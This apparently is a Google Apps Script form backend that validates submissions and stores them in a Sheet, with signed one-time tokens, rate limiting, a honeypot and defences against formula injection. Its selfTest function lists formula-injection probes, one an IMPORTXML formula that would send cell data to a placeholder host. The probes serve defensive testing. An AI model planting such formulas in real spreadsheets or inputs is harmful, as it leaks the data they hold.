



var LIMITS = {
  bodyChars:      4096,   // a legitimate submit is ~250 characters
  nameMin:        2,
  nameMax:        80,
  emailMax:       254,    // RFC 5321 maximum
  tokenMinAgeMs:  1200,   // a human cannot load and submit faster than this
  tokenMaxAgeMs:  30 * 60 * 1000
};


function getSigningKey_() {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty('SIGNING_KEY');
  if (!key) {
    key = Utilities.base64Encode(
      Utilities.getUuid() + '.' + Utilities.getUuid() + '.' + Date.now()
    );
    props.setProperty('SIGNING_KEY', key);
  }
  return key;
}

function hmac_(message) {
  var raw = Utilities.computeHmacSha256Signature(message, getSigningKey_());
  return Utilities.base64EncodeWebSafe(raw).replace(/=+$/, '');
}

/* Constant-time compare: a byte-by-byte `===` on a MAC leaks, through
   response timing, how many leading bytes of a guess were correct. */
function safeEquals_(a, b) {
  var x = String(a), y = String(b);
  if (x.length !== y.length) return false;
  var diff = 0;
  for (var i = 0; i < x.length; i++) diff |= x.charCodeAt(i) ^ y.charCodeAt(i);
  return diff === 0;
}


function issueToken() {
  var payload = Date.now() + '.' + Utilities.getUuid();
  return payload + '.' + hmac_(payload);
}

function consumeToken_(token) {
  if (typeof token !== 'string' || token.length > 200) return false;

  var parts = token.split('.');
  if (parts.length !== 3) return false;

  var issuedAt = parts[0], nonce = parts[1], mac = parts[2];
  if (!/^\d{13}$/.test(issuedAt) || !/^[0-9a-fA-F-]{36}$/.test(nonce)) return false;
  if (!safeEquals_(mac, hmac_(issuedAt + '.' + nonce))) return false;

  var age = Date.now() - Number(issuedAt);
  if (age < LIMITS.tokenMinAgeMs || age > LIMITS.tokenMaxAgeMs) return false;

  // Burn it. The cache entry outlives the token's own max age, so a
  // replay always lands on a key that is still present.
  var cache = CacheService.getScriptCache();
  var key = 'tok:' + nonce;
  if (cache.get(key)) return false;
  cache.put(key, '1', Math.ceil(LIMITS.tokenMaxAgeMs / 1000) + 60);

  return true;
}


var RATE_MAX = 300;
var RATE_WINDOW_MS = 60 * 60 * 1000;   // one hour

function rateLimitOk_() {
  var cache  = CacheService.getScriptCache();
  var now    = Date.now();
  var cutoff = now - RATE_WINDOW_MS;

  var recent = [];
  (cache.get('rate') || '').split(',').forEach(function (s) {
    var t = Number(s);
    if (t >= cutoff) recent.push(t);
  });

  if (recent.length >= RATE_MAX) return false;

  recent.push(now);
  cache.put('rate', recent.join(','), Math.ceil(RATE_WINDOW_MS / 1000) + 60);
  return true;
}


function clean_(value) {
  if (typeof value !== 'string') return '';
  return value
    .normalize('NFC')
    .replace(/[\u0000-\u001F\u007F-\u009F]/g, ' ')          // controls
    .replace(/[\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF]/g, '') // zero-width + bidi
    .replace(/\s+/g, ' ')
    .trim();
}

/* Letters (any script, so diacritics and non-Latin names are fine),
   spaces, and the punctuation that occurs in real names. No digits, no
   symbols, nothing that could open a formula or a URL. */
var NAME_RE = /^[\p{L}\p{M}][\p{L}\p{M} '’.\-]*$/u;

/* Deliberately stricter than the RFC: one @, a dotted domain, a
   2+ letter TLD, no quoting, no comments, no display name. */
var EMAIL_RE = /^[A-Za-z0-9!#$%&'*+/=?^_`{|}~.\-]{1,64}@[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*\.[A-Za-z]{2,63}$/;

function validateName_(raw) {
  var v = clean_(raw);
  if (v.length < LIMITS.nameMin || v.length > LIMITS.nameMax) return null;
  if (!NAME_RE.test(v)) return null;
  return v;
}

function validateEmail_(raw) {
  var v = clean_(raw).toLowerCase().replace(/\s/g, '');
  if (v.length < 6 || v.length > LIMITS.emailMax) return null;
  if (!EMAIL_RE.test(v)) return null;
  if (v.indexOf('..') !== -1) return null;
  if (v.charAt(0) === '.' || v.indexOf('.@') !== -1) return null;
  return v;
}

/* Returns { ok: true, record } or { ok: false, error }.
   `body` is the already-JSON-parsed request. */
function validateSubmission_(body) {
  if (!body || typeof body !== 'object' || Array.isArray(body)) {
    return { ok: false, error: 'invalid' };
  }

  /* Honeypot. A bot fills every field it finds; the page hides this one
     from people. Silence is the response - an error message only tells
     the bot what to change. Code.gs turns this into a fake success. */
  if (clean_(body.company) !== '') return { ok: false, error: 'honeypot' };

  var fullName  = validateName_(body.fullName);
  var signature = validateName_(body.signature);
  var email     = validateEmail_(body.email);

  if (!fullName)  return { ok: false, error: 'invalid_name' };
  if (!email)     return { ok: false, error: 'invalid_email' };
  if (!signature) return { ok: false, error: 'invalid_signature' };

  var now = new Date();
  var tz  = Session.getScriptTimeZone();

  return {
    ok: true,
    record: {
      receivedAt: Utilities.formatDate(now, tz, "yyyy-MM-dd'T'HH:mm:ssXXX"),
      fullName:   fullName,
      signature:  signature,
      email:      email
    }
  };
}




var SHEET_NAME = 'primeA';

function getInboxSheet_() {
  var file = SpreadsheetApp.getActive();
  return file.getSheetByName(SHEET_NAME) || file.insertSheet(SHEET_NAME, 0);
}

var COLUMNS = [
  'Received At',    // server clock, ISO 8601 — never trust a client timestamp
  'Full Name',
  'Signature',
  'Email'
];


function emailExists_(sheet, email) {
  var last = sheet.getLastRow();
  if (last < 2) return false;   // header only, or empty

  var column = sheet.getRange(2, 4, last - 1, 1).getValues();   // column 4 = Email
  for (var i = 0; i < column.length; i++) {
    var cell = String(column[i][0]).replace(/^'/, '').trim().toLowerCase();
    if (cell === email) return true;
  }
  return false;
}


function ensureHeader_(sheet) {
  if (sheet.getLastRow() > 0) return;

  sheet.getRange(1, 1, 1, COLUMNS.length)
       .setValues([COLUMNS])
       .setFontWeight('bold');
  sheet.setFrozenRows(1);

  // Widen the columns people actually read.
  sheet.setColumnWidth(1, 170);   // Received At
  sheet.setColumnWidth(2, 200);   // Full Name
  sheet.setColumnWidth(3, 200);   // Signature
  sheet.setColumnWidth(4, 240);   // Email
}


function asLiteralText_(value) {
  var s = String(value == null ? '' : value);
  return "'" + s;
}


function writeRow(record) {
  var lock = LockService.getScriptLock();
  // Concurrent submits would otherwise race for the same row index.
  if (!lock.tryLock(20000)) throw new Error('busy');

  try {
    var sheet = getInboxSheet_();
    ensureHeader_(sheet);

    if (emailExists_(sheet, record.email)) return false;

    var row = [
      asLiteralText_(record.receivedAt),
      asLiteralText_(record.fullName),
      asLiteralText_(record.signature),
      asLiteralText_(record.email)
    ];

    sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length).setValues([row]);
    SpreadsheetApp.flush();
    return true;
  } finally {
    lock.releaseLock();
  }
}



function respond_(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet(e) {
  var action = e && e.parameter ? e.parameter.action : '';
  if (action === 'token') {
    return respond_({ ok: true, token: issueToken() });
  }
  return respond_({ ok: false, error: 'not_found' });
}

function doPost(e) {
  try {
    /* The request never gets to touch the parser until its size is
       known-small. A legitimate submit is ~250 characters; the ceiling
       is there so a multi-megabyte body cannot burn the quota. */
    if (!e || !e.postData || typeof e.postData.contents !== 'string') {
      return respond_({ ok: false, error: 'invalid' });
    }
    if (e.postData.contents.length > LIMITS.bodyChars) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var body;
    try {
      body = JSON.parse(e.postData.contents);
    } catch (parseError) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var checked = validateSubmission_(body);

    /* A bot that filled the hidden field gets the same success envelope
       a person gets. Nothing is written. */
    if (!checked.ok && checked.error === 'honeypot') {
      return respond_({ ok: true });
    }
    if (!checked.ok) {
      return respond_({ ok: false, error: checked.error });
    }

    if (!consumeToken_(body.token)) {
      return respond_({ ok: false, error: 'token' });
    }

    if (!rateLimitOk_()) {
      return respond_({ ok: false, error: 'busy' });
    }

    /* writeRow returns false when this address has already applied. */
    if (!writeRow(checked.record)) {
      return respond_({ ok: false, error: 'duplicate' });
    }
    return respond_({ ok: true });

  } catch (err) {
    /* A lock timeout means another submit is mid-write - genuinely
       transient, so the visitor is told to retry rather than shown the
       generic failure. */
    if (err && err.message === 'busy') {
      return respond_({ ok: false, error: 'busy' });
    }
    /* Everything else is logged for the owner (Executions in the Apps
       Script console) and never returned - an exception message can name
       internal state. */
    console.error('doPost failed: ' + (err && err.stack ? err.stack : err));
    return respond_({ ok: false, error: 'server' });
  }
}


function setup() {
  var sheet = getInboxSheet_();
  getSigningKey_();
  ensureHeader_(sheet);
  console.log('Ready. Writing to the "' + sheet.getName() + '" tab.');
}

/* Editor-only smoke test. Writes one row with obviously fake data,
   including the payloads that a formula-injection attempt would use -
   open the sheet afterwards and confirm they sit there as inert text. */
function selfTest() {
  var probes = [
    '=IMPORTXML("https://example.invalid/?x="&A2,"//a")',
    '+1+1',
    '@SUM(A1:A9)',
    '-1-1'
  ];

  probes.forEach(function (probe) {
    var checked = validateSubmission_({
      fullName: probe, email: 'probe@example.com', signature: probe
    });
    if (checked.ok) throw new Error('validation let a formula through: ' + probe);
  });

  /* A fresh address each run, so the duplicate guard does not swallow the
     second smoke test. */
  var written = writeRow({
    receivedAt: new Date().toISOString(),
    fullName:   'Test Ionescu',
    signature:  'Test Ionescu',
    email:      'test+' + Date.now() + '@example.com'
  });

  console.log(written
    ? 'selfTest passed - delete the test row from the sheet.'
    : 'selfTest ran but wrote nothing (duplicate guard).');
}
